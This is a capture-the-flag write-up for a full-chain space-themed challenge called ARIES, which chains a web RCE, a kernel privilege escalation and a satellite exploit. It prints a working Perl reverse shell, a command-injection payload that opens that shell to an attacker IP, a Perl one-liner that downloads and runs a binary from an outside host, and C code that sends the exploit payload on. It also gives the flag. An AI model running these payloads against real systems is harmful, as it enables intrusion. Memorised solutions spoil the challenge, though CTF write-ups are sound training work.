Author: 0x6fe1be2
Version: 03-11-2025

# ARIES


Status: TBD

Category: PWN, SPACE, KERNEL, FULL CHAIN

Points: TBD

Description:

> Welcome to the cutting edge of space technology with ARIES™.
> 
> ARIES (Advanced Remote Infrastructure and Exploration System) is your complete solution for modern space operations. Our integrated platform seamlessly 
> connects your ground stations, satellites, and 
> control interfaces into one powerful ecosystem.
> 
> Join the future of space exploration with technology you can trust.

## TL;DR 
ARIES combines all three previous challenge to exploit the service start to finish.
We exploit the following parts:

[Hamal](https://gfelber.dev/writeups/ctrl_space_hamal.md) to get initial persistence

[Sheratan](https://gfelber.dev/writeups/ctrl_space_sheratan.md) to get privilege escalation and access to the space interface

[Mesarthim](https://gfelber.dev/writeups/ctrl_space_mesarthim.md) exploit the satellite and win

```txt
  ┌────────┐                      ┌───────────┐
  │ Client │            Satellite │ Mesarthim │
  └────────┘                      └──┬────────┘
    │    ▲ Internet           Space  ▼     ▲   
┌───┼────┼───┬───────────────┐    ┌────────┴──┐
│   ▼    │   │ GROUNDSTATION │    │ Satellite │
│n ┌─────┴─┐ │    QEMU VM    │    │ Uploader  │
│s │Lighttp│ │     ARM 64    │    └──┬────────┘
│j └┬──────┘ │               │       ▼     ▲   
│a  ▼    ▲   │ ┌───────────┐ │tap ┌────────┴──┐
│i ┌─────┴─┐ │ │ Mesarthim │◄┼────┤ Mesarthim │
│l │ Hamal │ │ │  Client   ├─┼───►│   Proxy   │
│  └┬──────┘ │ └──┬────────┘ │    └───────────┘
│   ▼    ▲   │    ▼     ▲    │
├────────┴───┴──────────┴────┤
│         Sheratan           │
└────────────────────────────┘  
```
 
## Files

We are given the following files:

```
aries/
├── Dockerfile
├── README.md
├── docker-compose.yml
├── kmod
│   ├── System.map
│   ├── kernel.config
│   ├── sheratan.c
│   └── sheratan.h
├── share
│   ├── Image
│   ├── hamal.ext4.xz
│   ├── mesarthim
│   ├── proxy.py
│   ├── rootfs.cpio.gz
│   └── run.sh
└── src
    ├── hamal.c
    ├── mesarthim.c
    ├── mesarthim.proto
    ├── mesarthim_client.c
    └── mesarthim_deploy.c
```

These are basically the same files we encountered during the other challenges, except for some differences.

We have one new files *proxy.py*, this service listens on port 5000 and emulates the only one connection per request behaviour of the satellite challenge. On the remote this will also be different and actually upload the payload to the satellite and return its response. 
[*proxy.py*](https://gfelber.dev/writeups/aries/proxy.py) 

The files that changes are the *Dockerfile* and *init* inside the *rootfs.cpio.gz*. Notably Dockerfile now adds a tap interface (eth1 inside the vm) and setups firewall rules. It also starts the proxy. This will force use to do the Privilege Escalation in Sheratan, as otherwise we won't be able to communicate with the proxy and reach the final part: Mesarthim.

[*Dockerfile*](https://gfelber.dev/writeups/aries/Dockerfile) [*init*](https://gfelber.dev/writeups/aries/init)

Also it is important to note that we will now have to exploit Hamal on a read only filesystem. This doesn't break our RCE exploit though.


## Exploitation

Instead of copying the flag to a exposed directory in Hamal, this time we will have to open a reverse shell. Luckily for use the `perl` is part of GNU coreutils and preinstalled on the system. So we have access to a whole programming language to write our reverse shell:

```perl
use Socket;
$i="REPLACE_ME_IP";
$p=REPLACE_ME_PORT;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
	if(!defined(fileno(STDIN))||
	   !defined(fileno(STDOUT))||
	   !defined(fileno(STDERR))){
		open(STDIN,">/dev/null");
		open(STDOUT,">/dev/null");
		open(STDERR,">/dev/null");
	}
	open(STDIN,">&S");
	open(STDOUT,">&S");
	open(STDERR,">&S");
	exec("/bin/sh -i");
}

```

We will also wrap it in nohup and replace our CMD payload in the hamal exploit script:

```python
REV_IP = "10.13.13.1"
REV_PORT = 1234
CMD = """; nohup perl -e 'use Socket;$i="REPLACE_ME_IP";$p=REPLACE_ME_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){if(!defined(fileno(STDIN))||!defined(fileno(STDOUT))||!defined(fileno(STDERR))){open(STDIN,">/dev/null");open(STDOUT,">/dev/null");open(STDERR,">/dev/null");}open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'&""".replace("REPLACE_ME_IP", REV_IP).replace("REPLACE_ME_PORT", str(REV_PORT))
```

After achieving persistence we can use some more perl scripts to download the binary and execute it for the `Sheratan part`

```bash
perl -MIO::Socket::INET -e '$h=shift;$r=shift;$o=shift||"out";$s=IO::Socket::INET->new("$h") or die$!;print $s "GET $r HTTP/1.0\r\nHost: $h\r\nConnection: close\r\n\r\n";undef $/;$_=<$s>;s/\A.*?\r?\n\r?\n//s;open F,">",$o or die$!;binmode F;print F $_' 10.13.13.1:1235 pwn /tmp/pwn
chmod +x /tmp/pwn
/tmp/pwn

```

Our Sheratan exploit stays mostly unchanged. The only difference is that our win functions will now connect to the proxy and send the Mesarthim payload instead of printing the flag.

Note: you can easily turn the input bytes into a header file using `xxd -i input`

```c
void win() { 
  int sock = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));
  struct sockaddr_in addr;
  bzero(&addr, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(PORT);
  inet_pton(AF_INET, IP, &addr.sin_addr);
  SYSCHK(connect(sock, (struct sockaddr *)&addr, sizeof(addr)));
  SYSCHK(send(sock, __input, __input_len, 0));
  shutdown(sock, SHUT_WR);
  char buf[0x2000];
  size_t len;
  while ((len = recv(sock, buf, sizeof(buf), 0)) > 0) {
    write(STDOUT_FILENO, buf, len);
  }
  putchar('\n');
  close(sock);
}

```

And our Mesarthim exploit doesn't require any changes!

## Final

[*exploit.py*](https://gfelber.dev/writeups/aries/exploit.py) [*pwn.c*](https://gfelber.dev/writeups/aries/pwn.c)

Flag: `space{s1c_1tur_4d_4stra_0a7470e22b1b824d}`
